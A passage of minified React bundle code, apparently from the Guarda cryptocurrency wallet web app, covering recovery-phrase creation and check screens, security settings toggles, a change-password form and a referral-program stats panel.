                })
            }
            ;
            return O.createElement(white_block, {
                className: Hq
            }, O.createElement("h3", {
                className: zq
            }, "Write down your 12-word recovery phrase"), O.createElement("p", {
                className: jq
            }, "This phrase gives access to all your funds. Keep it safe and secure, and don't share it with anyone. We do not store your private data and cannot restore your wallet if you lose the recovery phrase.", O.createElement("br", null), O.createElement("a", {
                target: "_blank",
                rel: "noopener noreferrer",
                href: "https://support.guarda.com/troubleshooting/how-to-use-guarda-wallet-with-firefox-private-pages"
            }, "Read more", " ", O.createElement("img", {
                alt: "external-link",
                width: "12px",
                height: "12px",
                src: Kq
            }))), O.createElement("div", {
                className: $q,
                onClick: handleRevealPhrase
            }, !r && O.createElement("div", {
                className: Zq
            }, O.createElement("div", {
                className: Jq
            }, O.createElement("div", {
                className: eX
            }, O.createElement("img", {
                alt: "lock",
                src: lX
            })), O.createElement("p", {
                className: tX
            }, "Click to reveal the recovery phrase"))), O.createElement("div", {
                className: Yq
            }, O.createElement("p", {
                onClick: handleCopy,
                className: Ht()(Xq, {
                    [Qq]: !r
                })
            }, c.map(( (e, t, a) => t % 4 == 0 && t !== a.length - 1 && 0 !== t ? O.createElement("span", {
                key: e + t
            }, O.createElement("br", null), e + " ") : O.createElement("span", {
                key: e + t
            }, e + " ")))), s && O.createElement("div", {
                className: qq
            }, "Copied  ", O.createElement("img", {
                alt: "arrow",
                width: "14px",
                src: "dark" === o ? iX : sX
            })))), O.createElement("div", {
                className: aX
            }, O.createElement("div", {
                className: nX
            }, "Step 1 of 3"), O.createElement("div", null, O.createElement("span", {
                onClick: t
            }, "Back"), O.createElement(Yl, {
                className: rX,
                color: "blue",
                size: "big",
                onClick: handleCompleteButtonClick,
                id: "writtenPasswordDown"
            }, "I saved it!"))))
        }
          , oX = "step-check_wrapper_W2whE"
          , cX = "step-check_header_1yGP7"
          , uX = "step-check_description_NdeOH"
          , dX = "step-check_testWordsWrapper_3SzBt"
          , mX = "step-check_testWord_3e3fF"
          , pX = "step-check_activeTestWord_3eyHW"
          , fX = "step-check_correctWord_3jns6"
          , EX = "step-check_error_2E1rr"
          , hX = "step-check_footerBlock_1uKOE app_footerBlock_n86Kc"
          , gX = "step-check_stepInfo_3csqH app_stepInfo_2VLE6"
          , yX = "step-check_buttonConfirm_3DRoN"
          , vX = "step-check_devModeHint_2AV9k"
          , _X = 4
          , getWordsForTest = (e, t) => {
            const a = [...e][Math.floor(Math.random() * e.size)]
              , n = Math.floor(4 * Math.random())
              , r = [...t].slice(0, 3);
            r.splice(n, 0, a);
            return r
        }
        ;
        function CreateMnemonicStepCheck_CreateMnemonicStepCheck(e) {
            let {mnemonic: t, onBackButtonClick: a, onComplete: n} = e;
            const {current: r} = (0,
            O.useRef)(Wf.generate())
              , [l,s] = (0,
            O.useState)("")
              , [i,o] = (0,
            O.useState)(!1)
              , [c,u] = (0,
            O.useState)({
                status: !1,
                message: ""
            })
              , d = new Set(t.split(" "))
              , m = new Set(r.split(" ").filter((e => !d.has(e))))
              , p = (0,
            O.useMemo)(( () => getWordsForTest(d, m)), [t, r, d])
              , handleConfirm = () => {
                if (l)
                    if (d.has(l) || i)
                        n();
                    else {
                        u({
                            status: !0,
                            message: "Nope. Make sure you save your recovery phrase"
                        });
                        o(!0)
                    }
                else {
                    u({
                        status: !0,
                        message: "Please answer the question"
                    });
                    setTimeout(( () => {
                        u({
                            status: !1,
                            message: ""
                        })
                    }
                    ), 2e3)
                }
            }
            ;
            return O.createElement(white_block, {
                className: oX
            }, O.createElement("h3", {
                className: cX
            }, "Check your recovery phrase"), O.createElement("p", {
                className: uX
            }, "Which of the following words belongs to your recovery phrase?"), p.length && O.createElement("div", {
                className: dX
            }, p.map(( (e, t) => O.createElement("div", {
                onClick: () => s(e),
                key: e + t,
                className: Ht()(mX, {
                    [pX]: l === e && !c.status,
                    [fX]: c.status && l && d.has(e),
                    [vX]: M.CM && d.has(e)
                })
            }, O.createElement("p", null, e)))), c.status && O.createElement("div", {
                className: EX
            }, c.message)), O.createElement("div", {
                className: hX
            }, O.createElement("div", {
                className: gX
            }, "Step 2 of 3"), O.createElement("div", null, O.createElement("span", {
                onClick: a
            }, "Back"), O.createElement(Yl, {
                className: yX,
                color: "blue",
                size: "big",
                onClick: handleConfirm,
                id: "writtenPasswordDown"
            }, "Confirm"))))
        }
        const CreateMnemonicStepPassword = e => {
            let {onBackButtonClick: t, onComplete: a} = e;
            return O.createElement(SetPasswordComponent, {
                isMnemonicStep: !0,
                onSetPassword: e => a({
                    password: e
                }),
                onBackButtonClick: t
            })
        }
          , CreateMnemonicStepWallets = e => {
            let {password: t} = e;
            const a = (0,
            $.I0)()
              , [n,r] = (0,
            O.useState)()
              , [l,s] = (0,
            O.useState)([])
              , i = l.length / Uf;
            (0,
            O.useEffect)(( () => {
                const e = new AbortController;
                a(rd.createTop10Currencies({
                    abortController: e,
                    setCreatedInfos: s,
                    setCurrentCreatingTicker: r,
                    password: t
                }));
                return () => e.abort()
            }
            ), []);
            return O.createElement("div", {
                className: Rq
            }, O.createElement("p", {
                className: Dq
            }, "Creating ", null == n ? void 0 : n.toUpperCase(), " wallet"), O.createElement(loader, {
                className: Mq,
                visible: !0,
                width: 20
            }), O.createElement(ProgressBar, {
                progress: i
            }))
        }
        ;
        let wX;
        !function(e) {
            e.PHRASE = "PHRASE";
            e.CHECK = "CHECK";
            e.PASSWORD = "PASSWORD";
            e.WALLETS = "WALLETS"
        }(wX || (wX = {}));
        const CreateWalletsMnemonic_CreateWalletsMnemonic = () => {
            const e = (0,
            j.k6)()
              , [t,a] = (0,
            O.useState)(wX.PHRASE)
              , [n,r] = (0,
            O.useState)()
              , [l,s] = (0,
            O.useState)();
            return O.createElement(O.Fragment, null, t === wX.PHRASE && O.createElement(CreateMnemonicStepPhrase, {
                onBackButtonClick: () => {
                    e.replace({
                        pathname: (0,
                        M.RU)("/")
                    })
                }
                ,
                onComplete: e => {
                    let {mnemonic: t} = e;
                    r(t);
                    a(wX.CHECK)
                }
            }), t === wX.CHECK && n && O.createElement(CreateMnemonicStepCheck_CreateMnemonicStepCheck, {
                mnemonic: n,
                onBackButtonClick: () => {
                    a(wX.PHRASE)
                }
                ,
                onComplete: () => {
                    a(wX.PASSWORD)
                }
            }), t === wX.PASSWORD && O.createElement(CreateMnemonicStepPassword, {
                onBackButtonClick: () => {
                    a(wX.CHECK)
                }
                ,
                onComplete: e => {
                    let {password: t} = e;
                    s(t);
                    a(wX.WALLETS)
                }
            }), t === wX.WALLETS && n && l && O.createElement(CreateMnemonicStepWallets, {
                mnemonic: n,
                password: l,
                onBackButtonClick: () => {
                    a(wX.CHECK)
                }
                ,
                onComplete: () => {
                    e.replace({
                        pathname: (0,
                        M.RU)("/")
                    })
                }
            }))
        }
          , bX = "create-mnemonic_centerContainer_F9T6R app_centerContainer_1VI1M";
        function CreateMnemonicPage() {
            return O.createElement("div", {
                className: "container"
            }, O.createElement("div", {
                className: "row"
            }, O.createElement("div", {
                className: "col-xs-6 col-xs-offset-3"
            }, O.createElement("div", {
                className: bX
            }, O.createElement(CreateWalletsMnemonic_CreateWalletsMnemonic, null)))))
        }
        const kX = "panel-left_wrapper_iBuGS app_wrapperBlock_2EpA3"
          , SX = "panel-left_radius_3cQYt"
          , CX = "panel-left_body_1LpXx"
          , NX = "panel-left_title_mjveD";
        function panel_extends() {
            panel_extends = Object.assign ? Object.assign.bind() : function(e) {
                for (var t = 1; t < arguments.length; t++) {
                    var a = arguments[t];
                    for (var n in a)
                        Object.prototype.hasOwnProperty.call(a, n) && (e[n] = a[n])
                }
                return e
            }
            ;
            return panel_extends.apply(this, arguments)
        }
        const LeftPanel = e => {
            let {radius: t, ...a} = e;
            return O.createElement("div", panel_extends({
                className: Ht()(kX, {
                    [SX]: t
                })
            }, a))
        }
          , TX = LeftPanel;
        function title_extends() {
            title_extends = Object.assign ? Object.assign.bind() : function(e) {
                for (var t = 1; t < arguments.length; t++) {
                    var a = arguments[t];
                    for (var n in a)
                        Object.prototype.hasOwnProperty.call(a, n) && (e[n] = a[n])
                }
                return e
            }
            ;
            return title_extends.apply(this, arguments)
        }
        const title = e => O.createElement("div", title_extends({
            className: NX
        }, e));
        function body_extends() {
            body_extends = Object.assign ? Object.assign.bind() : function(e) {
                for (var t = 1; t < arguments.length; t++) {
                    var a = arguments[t];
                    for (var n in a)
                        Object.prototype.hasOwnProperty.call(a, n) && (e[n] = a[n])
                }
                return e
            }
            ;
            return body_extends.apply(this, arguments)
        }
        const body = e => O.createElement("div", body_extends({
            className: CX
        }, e));
        function SesstionTimeoutPage() {
            const [e,t] = (0,
            O.useState)(!1)
              , [a,n] = (0,
            O.useState)(!1)
              , r = 6e3
              , l = 15
              , s = (0,
            $.I0)();
            (0,
            O.useEffect)(( () => {
                (async () => {
                    const e = await s(getSecureData(Ye));
                    if (void 0 === e || e && +e !== r)
                        n(!0)
                }
                )()
            }
            ), []);
            const handleSave = () => {
                t(!1);
                const e = undefined;
                s(setSecureData(Ye, a ? r : l));
                n((e => !e));
                cc.$.send(cc.d.SETTINGS_UPDATE_SESSION_TIMEOUT)
            }
            ;
            return O.createElement(O.Fragment, null, O.createElement(CW, {
                isNewDesign: !0,
                onClose: () => t(!1),
                visible: e,
                onSuccessPassword: handleSave,
                title: "Enter password to confirm changes",
                buttonText: "Save"
            }, O.createElement("p", null, "Turn ", a ? "off" : "on", " auto-logout if you are inactive for 15 minutes.")), O.createElement(yH, {
                handleChange: () => t(!0),
                isChecked: a
            }))
        }
        function NightModePage() {
            const e = (0,
            $.I0)()
              , t = (0,
            $.v9)(Ot)
              , toggleTheme = () => {
                e(Ct("dark" === t ? {
                    theme: Nt.light
                } : {
                    theme: Nt.dark
                }))
            }
            ;
            return O.createElement(yH, {
                handleChange: toggleTheme,
                isChecked: "dark" === t,
                id: "dark" === t ? "SETTINGS_NIGHT_MODE_OFF" : "SETTINGS_NIGHT_MODE_ON"
            })
        }
        function PasswordRequired() {
            const [e,t] = (0,
            O.useState)(!1)
              , [a,n] = (0,
            O.useState)(!1)
              , r = (0,
            $.I0)();
            (0,
            O.useEffect)(( () => {
                (async () => {
                    const e = await r(getSecureData(et));
                    e && n(e)
                }
                )()
            }
            ), []);
            const handleSave = () => {
                t(!1);
                r(setSecureData(et, !a));
                a ? cc.$.send(cc.d.SETTINGS_UPDATE_TX_PASSWORD_OFF) : cc.$.send(cc.d.SETTINGS_UPDATE_TX_PASSWORD_ON);
                n((e => !e))
            }
            ;
            return O.createElement(O.Fragment, null, O.createElement(CW, {
                isNewDesign: !0,
                onClose: () => t(!1),
                visible: e,
                onSuccessPassword: handleSave,
                title: "Enter password to confirm changes",
                buttonText: "Save"
            }, O.createElement("p", null, "Turn ", a ? "off" : "on", " password protection for outgoing transactions")), O.createElement(yH, {
                handleChange: () => t(!0),
                isChecked: a
            }))
        }
        const AX = "menu-settings_menu_1P5Hb menu_menu_2wA28"
          , xX = "menu-settings_active_2110s"
          , IX = "menu-settings_navUl_Pr807"
          , PX = "menu-settings_isElectron_1UrUJ"
          , LX = "menu-settings_withCheckbox_2aydx"
          , FX = "menu-settings_iconNotify_34gqp"
          , WX = "menu-settings_icon_2qHOF"
          , RX = "menu-settings_nightModeIcon_2JCvp"
          , BX = "menu-settings_referralIcon_1l2MW"
          , OX = "menu-settings_downloadBackupIcon_2SnYj"
          , DX = "menu-settings_downloadBackupIconMnemonic_K8_tY"
          , MX = "menu-settings_restoreBackupIcon_1Yx8-"
          , UX = "menu-settings_restoreBackupIconMnemonic_1D9Tb"
          , GX = "menu-settings_changePasswordIcon_281Pa"
          , VX = "menu-settings_askPasswordIcon_hIW07"
          , KX = "menu-settings_setSessionIcon_2QUWB"
          , HX = "menu-settings_rateUsIcon_1CnmQ"
          , zX = "menu-settings_helpCenterIcon_25tPL"
          , jX = Boolean(M.CM && "1" === (0,
        bu.ZP)("feature-mnemonic"))
          , $X = undefined
          , menu_settings = () => {
            const e = (0,
            $.v9)(selectedBackupNotify);
            return O.createElement("nav", {
                className: AX
            }, O.createElement(j.rs, null, O.createElement(j.AW, {
                path: "/app/settings"
            }, O.createElement("ul", {
                className: IX
            }, O.createElement("h3", null, "backup"), O.createElement("li", null, O.createElement(Y.OL, {
                to: "/app/settings/backup",
                exact: !0,
                activeClassName: xX
            }, jX ? O.createElement(O.Fragment, null, O.createElement("div", {
                className: Ht()(WX, DX)
            }), "Back up & sync with other devices") : O.createElement(O.Fragment, null, O.createElement("div", {
                className: Ht()(WX, OX)
            }), "Download backup"), e && O.createElement("span", {
                className: FX
            }))), O.createElement("li", null, O.createElement(Y.OL, {
                to: "/app/settings/restore-backup",
                activeClassName: xX,
                isActive: (e, t) => {
                    let {pathname: a} = t;
                    return a.startsWith("/app/settings/restore")
                }
            }, jX ? O.createElement("div", {
                className: Ht()(WX, UX)
            }) : O.createElement("div", {
                className: Ht()(WX, MX)
            }), "Restore")), O.createElement("h3", null, "security"), O.createElement("li", null, O.createElement(Y.OL, {
                exact: !0,
                to: "/app/settings/change-password",
                activeClassName: xX
            }, O.createElement("div", {
                className: Ht()(WX, GX)
            }), "Change password")), O.createElement("li", {
                className: LX
            }, O.createElement("div", {
                className: Ht()(WX, VX)
            }), O.createElement("p", null, "Ask password on transaction"), O.createElement(PasswordRequired, null)), O.createElement("li", {
                className: LX
            }, O.createElement("div", {
                className: Ht()(WX, KX)
            }), O.createElement("p", null, "Set session timeout to 15 mins"), O.createElement(SesstionTimeoutPage, null)), O.createElement("h3", null, "Other"), O.createElement("li", null, O.createElement(Y.OL, {
                exact: !0,
                to: "/app/settings/rate-us/",
                activeClassName: xX
            }, O.createElement("div", {
                className: Ht()(WX, HX)
            }), "Rate Us")), (0,
            M.d)() && O.createElement("li", {
                className: LX
            }, O.createElement("div", {
                dangerouslySetInnerHTML: {
                    __html: Kk()
                },
                className: Ht()(WX, RX)
            }), O.createElement("p", null, "Night mode"), O.createElement(NightModePage, null)))), O.createElement(j.AW, {
                path: "/app/supported-currencies"
            }, O.createElement(O.Fragment, null, O.createElement(Y.OL, {
                exact: !0,
                to: "/app/supported-currencies",
                activeClassName: xX
            }, "Supported Currencies"), O.createElement(Y.OL, {
                exact: !0,
                to: "/app/supported-currencies/tokens",
                activeClassName: xX
            }, "Supported Tokens")))))
        }
          , ZX = "popup-data-recording-error_popup_2WozD"
          , YX = "popup-data-recording-error_heading_uapa-";
        function PopupDataRecordingError(e) {
            let {visible: t, onClose: a, title: n} = e;
            const r = (0,
            $.I0)()
              , handleDownloadBackupClick = async () => {
                await r(handleDownload(Sm.FORCE));
                r(removeNotifyBackup());
                a()
            }
            ;
            return O.createElement(aa, {
                unclosable: !0,
                className: ZX,
                visible: t,
                onClose: a,
                width: 450
            }, n && O.createElement("h2", {
                className: YX
            }, n), O.createElement(DataRecordingAlert, {
                onDownloadBackupClick: handleDownloadBackupClick
            }))
        }
        const qX = "change-password_wrapper_2qNJb app_wrapperBlock_2EpA3"
          , XX = "change-password_wrapperForm_Z3ufk app_wrapperCenterBlock_bcslh"
          , QX = "change-password_mnemonic_1VBIc"
          , JX = "change-password_footerButtonStatus_2s-SY app_footerButtonStatus_1lnBU"
          , eQ = "change-password_footerButtonImg_1R9s7"
          , tQ = "change-password_bottomError_8Ifn2"
          , aQ = "change-password_loader_4dQbj"
          , nQ = "change-password_successStatus_1Mlhx"
          , rQ = "change-password_error_1TVjI"
          , lQ = "change-password_inputPassword_3ztck"
          , sQ = "change-password_bigDot_3Qbpx"
          , iQ = "change-password_inputFieldset_3PQPk"
          , oQ = "change-password_inputLegend_2OHmF"
          , cQ = "change-password_icon_2B12u"
          , uQ = "change-password_rightIcon_2wPWD"
          , dQ = "change-password_leftIcon_KOJkO"
          , mQ = "change-password_showPassIcon_1rub_"
          , pQ = "change-password_showPassIconBlue_1XcoB"
          , fQ = "change-password_hidePassIcon_12q18"
          , EQ = "change-password_hidePassIconBlue_1rDTt"
          , hQ = "change-password_clearPassIcon_SWaqm"
          , gQ = "change-password_clearPassIconBlue_17_Q2"
          , yQ = "change-password_inputClearPass_1YJKW"
          , vQ = "change-password_inputFocus_2zsrD"
          , _Q = "change-password_isVisible_3B8h7"
          , wQ = a.p + "14736ac0f8895afaf5ba64f0963837f6.svg";
        function ChangePassword() {
            const [e,t] = (0,
            O.useState)(!1)
              , [a,n] = (0,
            O.useState)(!1)
              , [r,l] = (0,
            O.useState)(!1)
              , [s,i] = (0,
            O.useState)(!1)
              , [o,c] = (0,
            O.useState)(!1)
              , [u,d] = (0,
            O.useState)(!1)
              , [m,p] = (0,
            O.useState)("")
              , [f,E] = (0,
            O.useState)("")
              , [h,g] = (0,
            O.useState)("")
              , [y,v] = (0,
            O.useState)(!1)
              , [_,w] = (0,
            O.useState)(!1)
              , [b,k] = (0,
            O.useState)(!1)
              , [S,C] = (0,
            O.useState)(!1)
              , [N,T] = (0,
            O.useState)(!1)
              , [A,x] = (0,
            O.useState)(!1)
              , [I,P] = (0,
            O.useState)(!1)
              , [L] = (0,
            O.useState)(!0)
              , [F,W] = (0,
            O.useState)(!1)
              , R = (0,
            $.I0)()
              , B = O.createRef()
              , D = (0,
            O.useRef)(null);
            (0,
            O.useEffect)(( () => {
                x(!1)
            }
            ), [m, f, h]);
            (0,
            O.useEffect)(( () => {
                v(!1)
            }
            ), [m]);
            (0,
            O.useEffect)(( () => {
                w(!1)
            }
            ), [f]);
            (0,
            O.useEffect)(( () => {
                k(!1)
            }
            ), [h]);
            const handleChange = async () => {
                var e, t;
                x(!1);
                const {isValid: a} = null !== (e = null === (t = B.current) || void 0 === t ? void 0 : t.validate()) && void 0 !== e ? e : {
                    idValid: !1
                };
                if (!a) {
                    x(!0);
                    return
                }
                T(!0);
                x(!1);
                const n = undefined;
                if (!R(checkMasterPassword(m))) {
                    var r;
                    T(!1);
                    C(!0);
                    p("");
                    null === (r = D.current) || void 0 === r || r.focus();
                    setTimeout(( () => C(!1)), 2e3);
                    return
                }
                const l = await R(changeMasterPassword(m, f));
                W(l.persistorFlushFailedFatally);
                await new Promise((e => {
                    setTimeout(( () => {
                        R(handleDownload(Sm.AFTER_CHANGE_PASSWORD));
                        T(!1);
                        P(!0);
                        setTimeout(( () => P(!1)), 2e3);
                        p("");
                        E("");
                        g("");
                        e()
                    }
                    ), 1e3)
                }
                ))
            }
            ;
            return O.createElement("div", {
                className: qX
            }, O.createElement("div", {
                className: XX
            }, O.createElement("h4", null, "Change Password"), L ? O.createElement("p", {
                className: QX
            }, "You will only change the password on this device. Don't forget to do the same on your other devices with Guarda app.") : O.createElement("p", null, "The new password will only work with", O.createElement("br", null), "the new backup that you need to download.", O.createElement("br", null), O.createElement("br", null), "⚠️⚠️⚠️ ", O.createElement("b", null, "Guarda cannot recover the password."), "️"), O.createElement(sf(), {
                ref: B
            }, O.createElement("fieldset", {
                className: Ht()(iQ, e && vQ, y && rQ, S && rQ),
                onFocus: () => t(!0),
                onBlur: () => t(!1)
            }, O.createElement("legend", {
                className: Ht()(oQ, e && vQ)
            }, "Old password"), O.createElement(lf.ValidatorField, {
                value: m,
                rules: zf.password
            }, (e => {
                let {isValid: t, message: a} = e;
                if (!t && A) {
                    C(!1);
                    v(!0)
                }
                return O.createElement(pa, {
                    isNewDesign: !0,
                    isInvalid: !t && A,
                    message: a,
                    top: 5
                }, O.createElement(Ea, {
                    ref: D,
                    autoFocus: !0,
                    className: Ht()(lQ, m && !s && sQ),
                    value: m,
                    onChange: e => {
                        let {target: {value: t}} = e;
                        return p(t)
                    }
                    ,
                    onEnter: handleChange,
                    autoComplete: "off",
                    placeholder: "Enter old password",
                    type: s ? "text" : "password"
                }))
            }
            )), m && !L && O.createElement("span", {
                onClick: () => p(""),
                className: Ht()(cQ, e ? gQ : hQ, dQ)
            }), O.createElement("span", {
                onClick: () => i((e => !e)),
                className: Ht()(cQ, !s && (e && !L ? pQ : mQ), s && (e && !L ? EQ : fQ), uQ)
            }), O.createElement("div", {
                className: tQ
            }, S ? "Old password is incorrect" : "")), O.createElement("fieldset", {
                className: Ht()(iQ, a && vQ, _ && rQ),
                onFocus: () => n(!0),
                onBlur: () => n(!1)
            }, O.createElement("legend", {
                className: Ht()(oQ, a && vQ)
            }, "New password"), O.createElement(lf.ValidatorField, {
                value: f,
                rules: zf.password
            }, (e => {
                let {isValid: t, message: a} = e;
                !t && A && w(!0);
                return O.createElement(pa, {
                    isNewDesign: !0,
                    isInvalid: !t && A,
                    message: a,
                    top: 5
                }, O.createElement(Ea, {
                    className: Ht()(lQ, f && !o && sQ),
                    value: f,
                    onChange: e => {
                        let {target: {value: t}} = e;
                        return E(t)
                    }
                    ,
                    onEnter: handleChange,
                    placeholder: "Enter new password",
                    autoComplete: "off",
                    type: o ? "text" : "password"
                }))
            }
            )), f && !L && O.createElement("span", {
                onClick: () => E(""),
                className: Ht()(cQ, a ? gQ : hQ, dQ)
            }), O.createElement("span", {
                onClick: () => c((e => !e)),
                className: Ht()(cQ, !o && (a && !L ? pQ : mQ), o && (a && !L ? EQ : fQ), uQ)
            })), O.createElement("fieldset", {
                className: Ht()(iQ, r && vQ, b && rQ),
                onFocus: () => l(!0),
                onBlur: () => l(!1)
            }, O.createElement("legend", {
                className: Ht()(oQ, r && vQ)
            }, "Repeat new password"), O.createElement(lf.ValidatorField, {
                value: h,
                rules: zf.passwordRepeat(f)
            }, (e => {
                let {isValid: t, message: a} = e;
                !t && A && k(!0);
                return O.createElement(pa, {
                    isNewDesign: !0,
                    isInvalid: !t && A,
                    message: a,
                    top: 5
                }, O.createElement(Ea, {
                    className: Ht()(lQ, h && !u && sQ),
                    value: h,
                    onChange: e => {
                        let {target: {value: t}} = e;
                        return g(t)
                    }
                    ,
                    onEnter: handleChange,
                    autoComplete: "off",
                    placeholder: "Enter new password",
                    type: u ? "text" : "password"
                }))
            }
            )), h && !L && O.createElement("span", {
                onClick: () => g(""),
                className: Ht()(cQ, r ? gQ : hQ, dQ)
            }), O.createElement("span", {
                onClick: () => d((e => !e)),
                className: Ht()(cQ, !u && (r && !L ? pQ : mQ), u && (r && !L ? EQ : fQ), uQ)
            }))), O.createElement("div", {
                className: JX
            }, O.createElement(Yl, {
                onClick: handleChange,
                color: "blue",
                isLoading: N
            }, I ? O.createElement(O.Fragment, null, O.createElement("img", {
                className: eQ,
                width: 24,
                height: 24,
                alt: "",
                src: wQ
            }), "Done") : "Change password")), O.createElement("div", {
                className: "clearfix"
            })), O.createElement(PopupDataRecordingError, {
                title: O.createElement(O.Fragment, null, "Password changed successfully"),
                visible: F,
                onClose: () => W(!1)
            }))
        }
        const bQ = "referral-program_wrapper_2pH_4 app_wrapperBlock_2EpA3"
          , kQ = "referral-program_await_3SFIK"
          , SQ = "referral-program_gradient_LM8jS"
          , CQ = "referral-program_wrapperForm_vwzHX app_wrapperCenterBlock_bcslh"
          , NQ = "referral-program_loaderText_38Vf7"
          , TQ = "referral-program_linkWrapper_2qe4m"
          , AQ = "referral-program_checkboxText_2-qsN"
          , xQ = "referral-program_grayButton_2xn_y"
          , IQ = "referral-program_downloadButton_CsWmn"
          , PQ = "referral-program_downloadLink_2WC3j"
          , LQ = "referral-program_infoList_c5JeH"
          , FQ = "referral-program_linkToRules_OdoeK"
          , WQ = "referral-program_noMargin_162ba"
          , RQ = "referral-program_currencyInfo_1ueRt inputs_currencyInfo_rdtMm"
          , BQ = "referral-program_loaderWrapper_1LY4m"
          , OQ = "referral-program_titleStatsBlock_2VlrD"
          , DQ = "referral-program_statsBlockField_3o_Dp"
          , MQ = "referral-program_statsBlockText_i0MVv"
          , UQ = "referral-program_statsBlockGreenText_3xeZK"
          , GQ = "referral-program_refLink_3PRVA"
          , VQ = "referral-program_infoSmallLink_3ig7j"
          , KQ = "referral-program_link_RZ61m"
          , HQ = "referral-program_buttonGetLink_2i9_B"
          , zQ = "referral-program_linkIcon_3rUFP"
          , jQ = "referral-program_walletForReward_V_oiq"
          , $Q = "referral-program_walletForRewardwithWidth_361AG"
          , ZQ = "referral-program_walletForRewardWithArrow_1jH7u"
          , YQ = "referral-program_goToReceiveWrapper_1L86i"
          , qQ = "referral-program_goToReceiveOneWallet_T1oCy"
          , XQ = "referral-program_goToReceive_3P4mC"
          , QQ = "referral-program_goToReceivePointer_358cq"
          , JQ = "referral-program_newEthWallet_1hl0d"
          , eJ = "referral-program_walletForRewardWrapper_3A70z"
          , tJ = "referral-program_divReward_1Sl9N"
          , aJ = "referral-program_popUpWrapper_KsPPX"
          , nJ = "referral-program_popUpTitle_2nGiA"
          , rJ = "referral-program_fieldsetReward_196Vo"
          , lJ = "referral-program_titleWithSeparator_1CEvt"
          , sJ = "referral-program_bodyWrapper_3pYEO"
          , iJ = "referral-program_fieldsetRewardWithArrow_1a4ES"
          , oJ = "referral-program_legendReward_MoR3O"
          , cJ = "referral-program_warningInfo_QM32A"
          , uJ = "referral-program_qrcode_22ibT"
          , dJ = "referral-program_qrcodeIcon_gqtvF"
          , mJ = "referral-program_walletForRewardBlock_2lfDS"
          , pJ = "referral-program_walletsListTitle_3Eqbc"
          , fJ = "referral-program_checkboxBlock_26VNO"
          , EJ = "referral-program_wrapperStatsBlock_dDdz1"
          , hJ = "referral-program_statsBlockSubBlock_2G5ND"
          , gJ = "referral-program_statsBlockTitle_15kaI"
          , yJ = "referral-program_rulesBlockTitle_ia9j_"
          , vJ = "referral-program_statsBlockSubField_2Xnzx"
          , _J = "referral-program_fiatEstimate_3Jmsq"
          , wJ = "referral-program_userSelect_3i57_"
          , bJ = "referral-program_loader_1d7tA"
          , kJ = a.p + "5391fc75ec1cb8c5392c9be934dfdb10.svg";
        async function get_params_with_sig(e) {
            let t = {};
            const a = await Se.Z.getApiByWallet(e);
            try {
                t = await a.createReferralSignature(e)
            } catch (e) {
                console.log("fail to create referral sig", e)
            }
            return {
                address: e.address,
                currency: e.currency,
                sig: t.sig,
                pubKey: t.pubKey
            }
        }
        function RefLinksList(e) {
            let {refLinks: t, wallets: a} = e;
            const n = (0,
            $.I0)()
              , r = (0,
            j.k6)()
              , [l,s] = (0,
            O.useState)({})
              , [i,o] = (0,
            O.useState)(a[0]);
            function findLink(e, t) {
                var a;
                const {link: n} = null !== (a = e.find((e => e.address.toLowerCase() === t.address.toLowerCase()))) && void 0 !== a ? a : {};
                return n
            }
            const c = findLink(t, i)
              , [u,d] = (0,
            O.useState)(c)
              , goToReceive = e => {
                r.push((0,
                M.RU)("/receive"));
                n(setActiveWallet(e))
            }
            ;
            (0,
            O.useEffect)(( () => {
                let e = !1;
                (async () => {
                    try {
                        const t = await get_params_with_sig(i);
                        if (e)
                            return;
                        const a = await n(getReferralStats(t));
                        if (e)
                            return;
                        s(a)
                    } catch (e) {
                        s({});
                        console.log("error getting referral stats", e)
                    }
                }
                )();
                return () => {
                    e = !0
                }
            }
            ), [n, i, i.address]);
            const handleChangeWallet = e => {
                o(e);
                const a = findLink(t, e);
                d(a)
            }
            ;
            return O.createElement("div", {
                className: sJ
            }, O.createElement("div", {
                className: lJ
            }, "Your referral link"), O.createElement("div", {
                className: TQ
            }, O.createElement("div", {
                className: GQ
            }, u), O.createElement(button_copy, {
                text: null != u ? u : ""
            }, (e => e ? O.createElement("img", {
                src: uf,
                alt: "",
                width: "20px",
                height: "20px"
            }) : O.createElement("img", {
                src: kJ,
                width: "20px",
                height: "20px",
                alt: ""
            })))), O.createElement("div", {
                className: lJ
            }, "Your stats"), O.createElement("div", {
                className: EJ
            }, O.createElement("div", {
                className: OQ
            }, "Earnings"), O.createElement("div", {
                className: hJ
            }, O.createElement("div", {
                className: MQ
            }, "Paid"), O.createElement("div", {
                className: Ht()(MQ, UQ, wJ)
            }, l.totalEarned && l.currentPeriodEarned && `${(0,
            Ko.i1)((0,
            Ko.h9)(l.totalEarned, l.currentPeriodEarned), 4)}  GRD`)), O.createElement("div", {
                className: hJ
            }, O.createElement("div", {
                className: MQ
            }, "Pending", O.createElement(tooltip, {
                text: "Rewards are distributed by the 5th of each month",
                width: "200px"
            }, O.createElement("div", {
                className: VQ
            }))), O.createElement("div", {
                className: Ht()(MQ, wJ)
            }, l.currentPeriodEarned && `${(0,
            Ko.i1)(l.currentPeriodEarned, 4)}  GRD`)), O.createElement("div", {
                className: OQ
            }, "Refferals"), O.createElement("div", {
                className: hJ
            }, O.createElement("div", {
                className: MQ
            }, "Registered users"), O.createElement("div", {
                className: MQ
            }, l.referralsCount)), O.createElement("div", {
                className: hJ
            }, O.createElement("div", {
                className: MQ
            }, "Referral actions"), O.createElement("div", {
                className: MQ
            }, l.referralOperationTotalCount && l.referralOperationTotalCount))), O.createElement("div", {
                className: lJ
            }, "Wallets for the rewards", O.createElement("span", {
                className: Ht()(FQ, {
                    [WQ]: !0
                })
            }, O.createElement("a", {
                href: "https://support.guarda.com/referral/referral-program-rules",
                target: "_blank",
                rel: "noreferrer noopener"
            }, "Program rules"), " ", O.createElement("a", {
                href: "https://support.guarda.com/referral/referral-program-rules",
                target: "_blank",
                rel: "noreferrer noopener"
            }, O.createElement("img", {
                src: Pg,
                className: zQ,
                alt: ""
            })))), O.createElement("div", {
                className: Ht()(YQ, 1 === a.length && qQ),
                onClick: () => 1 === a.length ? goToReceive(i) : null
            }, O.createElement("div", {
                className: Ht()(jQ, 1 !== a.length && ZQ, $Q)
            }, O.createElement(Mh, {
                newArrow: !0,
                isNoBorder: !0,
                isNewStyles: !0,
                withAddress: !0,
                withoutSubwallets: !0,
                noDisabledStyle: !0,
                disabled: 1 === a.length,
                wallets: a,
                selectedWallet: i,
                onChange: handleChangeWallet,
                customFilter: e => onCustomFilterWallets(e, [""], {
                    findAmongWallets: a
                })
            })), O.createElement("div", {
                className: Ht()(XQ, 1 !== a.length && QQ),
